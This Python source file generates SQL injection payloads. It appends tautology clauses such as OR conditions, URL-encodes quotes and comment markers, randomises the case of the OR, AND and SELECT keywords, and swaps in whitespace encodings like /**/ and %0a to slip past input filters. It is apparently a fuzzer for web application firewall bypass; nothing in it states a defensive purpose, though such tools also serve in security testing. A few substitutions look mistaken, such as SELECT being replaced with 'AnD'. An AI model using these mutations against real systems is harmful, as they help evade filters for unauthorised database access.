import random


def tautolog(input):
    rand = random.randint(1, 6)
    switch = {
        1: lambda: input + ' [blank] OR [blank] [randchar]  = [randchar]',
        2: lambda: input + ' [blank] OR [blank] [randint] < [randint]+1',
        3: lambda: input + ' [blank] OR [blank] [randint]+1 > [randint]',
        4: lambda: input + ' [blank] OR [blank] [randchar] in ( [randchar], [randchar]+1 ) ',
        5: lambda: input + ' [blank] OR [blank] [randchar] like [randchar]',
        6: lambda: input + ' [blank] OR [blank] [randint] between [randint]-1 and [randint]+1'
    }
    output = switch.get(rand)()
    return output


def unicode(input):
    rand = random.randint(1, 5)
    switch = {
        1: lambda: input.replace('\'', '%27'),
        2: lambda: input.replace('\"', '%22'),
        3: lambda: input.replace(')', '%29'),
        4: lambda: input.replace('#', '%23'),
        5: lambda: input.replace('--', '%2d%2d')
    }
    output = switch.get(rand)()
    return output

def ascii(input):
    output = input.replace('[randchar]', '[randascii]')
    return output

def keyword_or(input):
    rand = random.randint(1, 4)
    switch={
        1: lambda :input.replace('OR', '||'),
        2: lambda :input.replace('OR', 'Or'),
        3: lambda :input.replace('OR', 'or'),
        4: lambda :input.replace('OR', 'oR')
    }
    output = switch.get(rand)()
    return output

def keyword_and(input):
    rand = random.randint(1, 8)
    switch={
        1: lambda :input.replace('AND', '&&'),
        2: lambda :input.replace('AND', 'and'),
        3: lambda :input.replace('AND', 'And'),
        4: lambda :input.replace('AND', 'aNd'),
        5: lambda :input.replace('AND', 'anD'),
        6: lambda :input.replace('AND', 'aND'),
        7: lambda :input.replace('AND', 'AnD'),
        8: lambda :input.replace('AND', 'ANd')

    }
    output = switch.get(rand)()
    return output

def keyword_select(input):
    rand = random.randint(1, 8)
    switch = {
        1: lambda :input.replace('SELECT', 'sELECT'),
        2: lambda :input.replace('SELECT', 'SeLECT'),
        3: lambda :input.replace('SELECT', 'SElECT'),
        4: lambda :input.replace('SELECT', 'SELeCT'),
        5: lambda :input.replace('SELECT', 'SELEcT'),
        6: lambda :input.replace('SELECT', 'SELECt'),
        7: lambda :input.replace('SELECT', 'AnD'),
        8: lambda :input.replace('SELECT', 'ANd')

    }
    output = switch.get(rand)()
    return output


def blank(input):
    rand = random.randint(1, 8)
    switch = {
        1: lambda: input.replace('[blank]','+'),
        2: lambda: input.replace('[blank]', '/**/'),
        3: lambda: input.replace('[blank]', '%20'),
        4: lambda: input.replace('[blank]', '%09'),
        5: lambda: input.replace('[blank]', '%0a'),
        6: lambda: input.replace('[blank]', '%0b'),
        7: lambda: input.replace('[blank]', '0c'),
        8: lambda: input.replace('[blank]', '%0d')

    }
    output = switch.get(rand)()
    return output

